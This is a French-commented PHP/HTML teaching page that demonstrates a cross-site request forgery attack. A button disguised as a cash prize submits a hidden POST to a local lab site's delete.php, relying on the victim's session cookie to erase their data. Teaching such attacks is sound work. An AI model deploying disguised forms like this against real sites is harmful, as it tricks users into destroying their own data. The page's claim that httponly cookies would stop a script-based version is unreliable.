<?php

/**
 * Page web d'un site malveillant. Cette page web cache un formulaire
 * POST qui va attaquer le site www.
 * Noter qu'ici on ne peut pas déposer de cookie d'authentification,
 * seul le site cible peut le faire.
 */

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>

    <h1>Site WWW-EVIL (Attaquant)</h1>

    <!-- L'attaque peut marcher avec une requete GET (balise a) ou POST (form) -->
    <!-- <a href="delete.php">Supprimer toutes mes données</a> -->

    <!-- L'attaquant a identifié l'URL (delete.php) et connaît l'input à fournir 'delete-my-data' -->
    <!-- Il fabrique un formulaire qui ne dit pas ce qu'il fait qu'il présente malicieusement à l'utilisateur -->
    <form action="http://localhost:5001/delete.php" method="post">
        <input type="submit" name="delete-my-data" value="Gagner 10 000 euros tout de suite !">
    </form>

    <blockquote>Sur cette page, le formulaire cache un formulaire vers le site WWW pour supprimer les données de l'utilisateur (<code>POST WWW/delete.php</code>). L'attaquant compte sur le fait qu'il soit actuellement authentifié sur ce site via le cookie <code>PHPSESSID</code> présent dans son navigateur.</blockquote>

    <blockquote>Cette attaque pourrait être menée via du JS (en émettant une requête avec <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a> <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">fetch</a>. Mais si le cookie est en mode <code>httponly</code> le JS ne peut pas le manipuler et l'attaque échouerait. Via un form, comme ici, la requête <code>POST</code> émise emporte toujours le cookie avec</blockquote>

</body>

</html>